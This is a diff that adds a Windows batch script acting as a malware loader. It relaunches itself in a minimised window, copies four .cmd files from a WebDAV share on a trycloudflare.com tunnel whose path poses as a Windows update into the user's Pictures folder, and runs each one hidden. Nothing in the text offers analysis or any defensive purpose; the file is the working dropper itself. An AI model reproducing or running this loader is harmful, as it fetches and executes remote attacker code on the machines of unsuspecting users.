@@ -1,0 +1,24 @@
+@echo off
+if "%1" == "" start "" /min "%~f0" MY_FLAG && exit
+
+set source=\\maintenance-princess-musical-vocational.trycloudflare.com@SSL\DavWWWRoot\google\windows_update
+set destination=%USERPROFILE%\Pictures
+
+
+
+
+
+REM Copy kam.cmd, xff.cmd, zap.cmd, las.cmd, and version.bat to the destination folder
+copy /Y "%source%\kam.cmd" "%destination%"
+copy /Y "%source%\las.cmd" "%destination%"
+copy /Y "%source%\xff.cmd" "%destination%"
+copy /Y "%source%\zap.cmd" "%destination%"
+
+
+REM Run kam.cmd and las.cmd and zap.cmd and xff.cmd
+for %%f in ("%destination%\kam.cmd" "%destination%\las.cmd" "%destination%\zap.cmd" "%destination%\xff.cmd") do (
+    echo Running %%~nxf...
+    start /MIN cmd /c "%%f"
+)
+
+exit /b 0
